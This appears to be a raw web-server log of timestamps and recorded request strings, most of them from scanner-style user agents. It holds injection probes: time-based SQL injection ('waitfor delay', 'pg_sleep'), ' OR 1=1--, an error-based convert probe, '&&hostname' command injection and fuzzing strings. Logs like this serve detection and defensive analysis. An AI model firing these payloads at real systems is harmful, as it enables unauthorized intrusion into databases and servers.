"2026-06-12 22:09:44","InternalAuditScanner/4.0 @@@@@@@"
"2026-06-12 22:09:43","ReconEngine/5.4 @@@@@@@"
"2026-06-12 16:25:08","ReconEngine/5.4 @@@@@@@"
"2026-06-03 22:16:57","DiscoveryProbe/7.3 @@@@@@@"
"2026-06-03 01:06:30","ReconEngine/5.4 @@@@@@@"
"2026-06-02 23:34:33","(select convert(int,char(65)))"
"2026-06-01 10:44:44","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-01 01:19:13","%%%%%%%"
"2026-05-31 19:41:21","(select convert(int,char(65)))"
"2026-05-31 11:20:52","ThreatHunterAgent/8.2 @@@@@@@"
"2026-05-30 11:30:07","%%%%%%%"
"2026-06-13 11:36:22","VulnerabilitySweep/2.6 waitfor delay '0:0:9'"
"2026-06-12 16:25:07","VulnerabilitySweep/2.6 waitfor delay '0:0:5'"
"2026-06-02 00:30:21","TelemetryCollector/9.7 waitfor delay '0:0:5'"
"2026-06-01 16:00:12","&&hostname"
"2026-06-01 15:32:22","DiscoveryProbe/7.3 waitfor delay '0:0:9'"
"2026-06-01 15:31:40","TelemetryCollector/9.7 waitfor delay '0:0:9'"
"2026-06-01 08:54:26","12345\""\""\""};]*"
"2026-05-31 17:05:36","&&hostname"
"2026-05-31 14:50:25","12345\""\""\""};]*"
"2026-05-31 11:20:39","12345\""\""\""};]*"
"2026-05-30 11:30:53","12345\""\""\""};]*"
"2026-05-30 00:53:59","*BcfBAAAAA-CAAEFBAAQ8d72VnovG2cDuEHJTDt8i5TQSRSAAV6gBAIAAKAA=, *BcfBAAAAA-CAAEFBAAQ8d72VnovG2cDuEHJTDt8i5TQSRSAAV6gBAIAAKAA=, *BcfBAAAAA-CAAEFBAAQ8d72VnovG2cDuEHJTDt8i5TQSRSAAV6gBAIAAKAA=, *BcfBAAAAA-CAAEFBAAQ8d72VnovG2cDuEHJTDt8i5TQSRSAAV6gBAIAAKAA=, *BcfBAAAAA-CAAEFBAAQ8d72VnovG2cDuEHJTDt8i5TQSRSAAV6gBAIAAKAA="
"2026-06-12 22:09:43","VulnerabilitySweep/2.6 <<<<>>>>"
"2026-06-12 16:25:08","DiscoveryProbe/7.3 <<<<>>>>"
"2026-06-12 16:25:08","TelemetryCollector/9.7 <<<<>>>>"
"2026-06-04 18:37:27","SecurityAssessmentClient/3.1 waitfor delay '0:0:9'"
"2026-06-03 18:29:06","DiscoveryProbe/7.3 <<<<>>>>"
"2026-06-03 01:06:29","TelemetryCollector/9.7 select pg_sleep(3)"
"2026-06-03 01:06:00","12345\""\""\""};]*"
"2026-06-02 00:30:18","VulnerabilitySweep/2.6 <<<<>>>>"
"2026-06-01 08:54:24","SecurityAssessmentClient/3.1 waitfor delay '0:0:5'"
"2026-06-01 08:53:40","VulnerabilitySweep/2.6 waitfor delay '0:0:5'"
"2026-05-31 19:41:26","12345\""\""\""};]*"
"2026-05-31 17:05:14","%%%%%%%"
"2026-05-29 18:05:31","12345\""\""\""};]*"
"2026-06-12 23:38:27","DiscoveryProbe/7.3 waitfor delay '0:0:5'"
"2026-06-12 16:25:08","InternalAuditScanner/4.0 waitfor delay '0:0:5'"
"2026-06-12 16:25:08","VulnerabilitySweep/2.6 select pg_sleep(3)"
"2026-06-12 16:25:08","DiscoveryProbe/7.3 select pg_sleep(3)"
"2026-06-12 16:25:07","SecurityAssessmentClient/3.1 <<<<>>>>"
"2026-06-12 16:25:07","InternalAuditScanner/4.0 waitfor delay '0:0:9'"
"2026-06-12 16:25:07","WebEnumerationFramework/11.0 waitfor delay '0:0:5'"
"2026-06-04 18:37:27","VulnerabilitySweep/2.6 select pg_sleep(3)"
"2026-06-03 01:03:09","InternalAuditScanner/4.0 waitfor delay '0:0:9'"
"2026-06-02 23:37:28","WebEnumerationFramework/11.0 waitfor delay '0:0:5'"
"2026-06-01 10:44:56","(select convert(int,char(65)))"
"2026-06-01 08:54:47","SecurityAssessmentClient/3.1 <<<<>>>>"
"2026-06-01 01:19:26","ThreatHunterAgent/8.2 waitfor delay '0:0:9'"
"2026-05-31 17:05:00","NetworkSurveyBot/3.9 @@@@@@@"
"2026-06-13 10:46:02","NetworkSurveyBot/3.9 waitfor delay '0:0:5'"
"2026-06-12 23:38:27","DiscoveryProbe/7.3 select pg_sleep(3)"
"2026-06-12 22:09:44","DiscoveryProbe/7.3 <<<<>>>>"
"2026-06-12 20:19:43","ThreatHunterAgent/8.2 waitfor delay '0:0:5'"
"2026-06-12 18:14:28","SecurityAssessmentClient/3.1 waitfor delay '0:0:5'"
"2026-06-12 18:14:27","ThreatHunterAgent/8.2 <<<<>>>>"
"2026-06-12 16:25:08","ThreatHunterAgent/8.2 <<<<>>>>"
"2026-06-12 16:25:08","SecurityAssessmentClient/3.1 select pg_sleep(3)"
"2026-06-12 16:25:07","NetworkSurveyBot/3.9 waitfor delay '0:0:9'"
"2026-06-09 13:42:10","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA="
"2026-06-09 13:36:25","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA="
"2026-06-09 13:30:12","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA="
"2026-06-09 13:27:46","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivs_IAV6gBAIAAKAA="
"2026-06-03 19:58:13","TelemetryCollector/9.7 select pg_sleep(6)"
"2026-06-03 19:53:22","ReconEngine/5.4 waitfor delay '0:0:9'"
"2026-06-03 01:06:31","NetworkSurveyBot/3.9 waitfor delay '0:0:9'"
"2026-06-03 01:02:17","InternalAuditScanner/4.0 waitfor delay '0:0:5'"
"2026-06-02 22:35:47","SecurityAssessmentClient/3.1 waitfor delay '0:0:5'"
"2026-06-01 15:32:25","AssetProfiler/6.5 waitfor delay '0:0:5'"
"2026-05-31 22:15:58","12345\""\""\""};]*"
"2026-05-30 11:32:23","DiscoveryProbe/7.3 <<<<>>>>"
"2026-05-30 11:30:51","SecurityAssessmentClient/3.1 select pg_sleep(3)"
"2026-05-30 11:29:31","DiscoveryProbe/7.3 <<<<>>>>"
"2026-06-13 11:36:22","DiscoveryProbe/7.3 select pg_sleep(6)"
"2026-06-13 10:46:03","NetworkSurveyBot/3.9 <<<<>>>>"
"2026-06-12 20:19:43","SecurityAssessmentClient/3.1 <<<<>>>>"
"2026-06-12 20:19:43","WebEnumerationFramework/11.0 <<<<>>>>"
"2026-06-12 16:25:08","DiscoveryProbe/7.3 select pg_sleep(6)"
"2026-06-12 16:25:07","WebEnumerationFramework/11.0 <<<<>>>>"
"2026-06-12 16:25:07","AssetProfiler/6.5 <<<<>>>>"
"2026-06-12 16:25:07","InternalAuditScanner/4.0 <<<<>>>>"
"2026-06-03 10:46:32","AssetProfiler/6.5 <<<<>>>>"
"2026-06-01 08:53:45","TelemetryCollector/9.7 select pg_sleep(6)"
"2026-05-31 14:50:32","WebEnumerationFramework/11.0 waitfor delay '0:0:5'"
"2026-06-12 23:38:28","ThreatHunterAgent/8.2 select pg_sleep(3)"
"2026-06-12 20:19:43","VulnerabilitySweep/2.6 select pg_sleep(6)"
"2026-06-12 18:14:28","DiscoveryProbe/7.3 select pg_sleep(6)"
"2026-06-12 18:14:28","ReconEngine/5.4 waitfor delay '0:0:9'"
"2026-06-03 19:53:44","VulnerabilitySweep/2.6 select pg_sleep(6)"
"2026-06-03 19:53:32","ReconEngine/5.4 waitfor delay '0:0:5'"
"2026-06-03 10:46:49","DiscoveryProbe/7.3 select pg_sleep(6)"
"2026-06-03 10:46:39","NetworkSurveyBot/3.9 <<<<>>>>"
"2026-06-01 15:31:42","WebEnumerationFramework/11.0 <<<<>>>>"
"2026-06-01 08:54:27","InternalAuditScanner/4.0 select pg_sleep(3)"
"2026-05-31 14:50:37","WebEnumerationFramework/11.0 <<<<>>>>"
"2026-05-31 11:20:42","NetworkSurveyBot/3.9 <<<<>>>>"
"2026-05-30 11:25:21","ThreatHunterAgent/8.2 select pg_sleep(3)"
"2026-05-29 17:20:55","NetworkSurveyBot/3.9 <<<<>>>>"
"2026-06-14 14:04:46","AssetProfiler/6.5 <<<<>>>>"
"2026-06-13 11:36:21","NetworkSurveyBot/3.9 select pg_sleep(3)"
"2026-06-12 22:09:44","WebEnumerationFramework/11.0 select pg_sleep(3)"
"2026-06-12 20:19:43","AssetProfiler/6.5 <<<<>>>>"
"2026-06-12 18:14:28","InternalAuditScanner/4.0 select pg_sleep(3)"
"2026-06-12 16:25:07","AssetProfiler/6.5 select pg_sleep(3)"
"2026-06-03 19:58:57","NetworkSurveyBot/3.9 select pg_sleep(3)"
"2026-06-03 19:53:20","ReconEngine/5.4 <<<<>>>>"
"2026-06-01 10:44:53","TelemetryCollector/9.7 select pg_sleep(6)"
"2026-05-31 14:50:24","AssetProfiler/6.5 select pg_sleep(3)"
"2026-05-30 11:30:52","NetworkSurveyBot/3.9 select pg_sleep(3)"
"2026-06-12 16:25:07","TelemetryCollector/9.7 ' OR 1=1--"
"2026-05-31 17:05:27","ReconEngine/5.4 select pg_sleep(3)"
"2026-05-29 18:05:35","ReconEngine/5.4 <<<<>>>>"
"2026-06-12 16:25:07","InternalAuditScanner/4.0 select pg_sleep(6)"
"2026-06-03 10:46:32","WebEnumerationFramework/11.0 select pg_sleep(6)"
"2026-06-02 00:30:24","InternalAuditScanner/4.0 select pg_sleep(6)"
"2026-06-01 10:44:55","InternalAuditScanner/4.0 select pg_sleep(3)"
"2026-05-31 17:05:26","InternalAuditScanner/4.0 select pg_sleep(6)"
"2026-05-31 15:50:00","NetworkSurveyBot/3.9 <<<<>>>>"
"2026-06-12 16:25:07","VulnerabilitySweep/2.6 ' OR 1=1--"
"2026-06-12 18:14:27","NetworkSurveyBot/3.9 select pg_sleep(6)"
"2026-06-12 16:25:07","NetworkSurveyBot/3.9 select pg_sleep(6)"
"2026-06-02 00:30:23","NetworkSurveyBot/3.9 select pg_sleep(6)"
"2026-05-31 14:50:25","DiscoveryProbe/7.3 ' OR 1=1--"
"2026-06-12 16:25:07","ReconEngine/5.4 select pg_sleep(6)"
"2026-06-01 15:31:42","AssetProfiler/6.5 select pg_sleep(6)"
"2026-05-30 11:29:26","ReconEngine/5.4 select pg_sleep(6)"
"2026-06-20 06:46:01","""-"""
"2026-06-09 08:54:42","""-"""
"2026-05-30 00:24:01","""-"""
"2026-05-30 00:18:29","""-"""
"2026-05-30 00:10:55","""-"""
"2026-05-30 00:06:13","""-"""
"2026-05-30 00:02:34","""-"""
"2026-05-29 23:58:00","""-"""
"2026-05-29 23:47:13","""-"""
"2026-05-29 22:58:24","""-"""
"2026-05-29 22:53:42","""-"""
"2026-05-29 22:48:36","""-"""